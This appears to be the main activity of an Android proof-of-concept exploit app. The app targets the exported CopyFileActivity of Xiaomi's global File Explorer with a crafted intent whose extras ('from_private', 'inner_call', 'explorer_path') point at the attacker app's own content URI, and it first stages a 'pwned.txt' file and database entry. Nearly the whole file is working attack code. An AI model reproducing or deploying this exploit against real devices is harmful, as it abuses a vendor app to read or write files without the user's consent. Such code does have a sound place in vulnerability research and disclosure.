package com.fileexplorer.exploit;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

import android.util.Log;
import android.widget.Button;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity"; // Tag for Logcat

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate called"); // Log activity creation
        setContentView(R.layout.activity_main);

        Button button = findViewById(R.id.exploit);
        button.setOnClickListener(view -> {
            Log.d(TAG, "Exploit button clicked"); // Log button click
            setupDatabaseAndIntent();
        });
    }



    private void setupDatabaseAndIntent() {
        Log.d(TAG, "setupDatabaseAndIntent called"); // Log method entry

        copyFileToInternalStorage();

        DatabaseHelper dbHelper = new DatabaseHelper(this);
        dbHelper.insertExploitData();

        Uri uri = Uri.parse("content://com.fileexplorer.exploit/pwned.txt");
        Log.d(TAG, "URI parsed: " + uri.toString()); // Log the parsed URI

        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.mi.android.globalFileexplorer", "com.android.fileexplorer.activity.CopyFileActivity"));
        Log.d(TAG, "Intent component set: " + intent.getComponent().toString()); // Log the component

        intent.putExtra("from_private", true);
        intent.putExtra("inner_call", true);
        intent.putExtra("explorer_path", "content://com.fileexplorer.exploit/pwned.txt");
        Log.d(TAG, "Intent extras set"); //log that extras have been set.

        intent.setData(uri);
        intent.setAction(Intent.ACTION_SEND);
        Log.d(TAG, "Intent action and data set"); //Log that action and data are set

        try {
            startActivity(intent);
            Log.d(TAG, "Intent started successfully"); // Log successful intent start
        } catch (Exception e) {
            Log.e(TAG, "Failed to start activity: " + e.getMessage(), e); // Log any exceptions
        }
    }

    private void copyFileToInternalStorage() {
        Log.d(TAG, "copyFileToInternalStorage called"); // Log method entry
        try {
            InputStream inputStream = getAssets().open("pwned.txt"); //get from assets directory
            Log.d(TAG, "Input stream opened from assets");
            File outFile = new File(getFilesDir(), "pwned.txt");
            Log.d(TAG, "Output file path: " + outFile.getAbsolutePath()); // Log the output file path
            FileOutputStream outputStream = new FileOutputStream(outFile);

            byte[] buffer = new byte[1024];
            int length;
            while ((length = inputStream.read(buffer)) > 0) {
                outputStream.write(buffer, 0, length);
            }

            outputStream.close();
            inputStream.close();
            Log.d(TAG, "File copied to internal storage successfully"); // Log successful file copy
        } catch (IOException e) {
            Log.e(TAG, "Error copying file to internal storage", e); // Log any exceptions
        }
    }
}
